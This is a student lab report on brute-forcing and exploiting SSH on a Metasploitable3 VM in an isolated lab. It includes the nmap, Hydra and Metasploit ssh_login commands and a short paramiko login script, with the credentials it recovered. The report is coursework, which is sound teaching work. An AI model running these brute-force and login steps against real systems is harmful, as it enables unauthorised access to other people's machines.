# ICS344 Project – Phase 1 Report

**Title:** SSH Service Exploitation on Metasploitable3  
**Student:** Sultan Alatawi  
**Date:** April 27, 2025

---

## Objective
The goal of Phase 1 is to exploit a vulnerable SSH service running on a Metasploitable3 virtual machine (victim) using a Kali Linux machine (attacker).  
This phase demonstrates successful brute-force attacks using Hydra, manual exploitation via Metasploit Framework, and automation through a custom Python script (Proof of Concept).

---

## Environment Setup
- **Attacker Machine:** Kali Linux  
  - IP Address: `192.168.8.164/24`
- **Victim Machine:** Metasploitable3 Ubuntu 14.04  
  - IP Address: `192.168.8.165/24`
- **Network Setup:** Both machines are configured on the same private subnet (`192.168.8.x`) to allow direct communication.

Both VMs were connected through a host-only/private network ensuring no external internet access during testing.

---

## Task 1.1: Manual Exploitation Using Metasploit

### Step-by-Step Actions

### 1. Network Connectivity Test

Verified communication between attacker and victim:

```bash
ping 192.168.8.165


## 2. Scanning the Victim with Nmap

Discovered open ports and running services:

```bash
nmap -sV 192.168.8.165
```

**Key findings:**
- Port 22/tcp (SSH) - OpenSSH 6.6.1p1
- Port 21/tcp (FTP) - ProFTPD 1.3.5
- Port 80/tcp (HTTP) - Apache httpd 2.4.7

---

## 3. Brute-Forcing SSH with Hydra

Attempted to brute-force SSH login credentials:

```bash
hydra -l vagrant -P /usr/share/wordlists/rockyou.txt ssh://192.168.8.165
```

**Result:**
- Username: `vagrant`
- Password: `vagrant`

---

## 4. Launching Metasploit Framework

Started Metasploit:

```bash
sudo msfconsole
```

---

## 5. Exploiting SSH Using Metasploit

Loaded the SSH login module:

```bash
use auxiliary/scanner/ssh/ssh_login
```

Set necessary options:

```bash
set RHOSTS 192.168.8.165
set USERNAME vagrant
set PASSWORD vagrant
set STOP_ON_SUCCESS true
run
```

---

## 6. Opening the SSH Session

After successful login:

```bash
sessions
sessions -i 1
```

---

## 7. Verifying Shell Access

Executed simple commands inside the victim machine:

```bash
whoami
uname -a
```

**Output:**
- Current user: `vagrant`
- Operating System: Ubuntu 14.04 LTS

---

# Task 1.2: Automated Exploitation Using a Custom Python Script

## Step-by-Step Actions

### 1. Installing Python SSH Library

Installed `paramiko` for SSH communication:

```bash
sudo apt update
sudo apt install python3-pip
pip3 install paramiko
```

---

### 2. Developing the Custom Script

Created a script `ssh_exploit.py` to automate the login process:

```python
import paramiko

target_ip = "192.168.8.165"
port = 22
username = "vagrant"
password = "vagrant"

def ssh_connect(ip, port, user, passwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port=port, username=user, password=passwd)
        print(f"[+] Connected successfully to {ip} via SSH!")
        stdin, stdout, stderr = client.exec_command("whoami")
        print("[+] Command output:")
        print(stdout.read().decode())
        client.close()
    except Exception as e:
        print(f"[-] Connection failed: {e}")

if __name__ == "__main__":
    ssh_connect(target_ip, port, username, password)
```
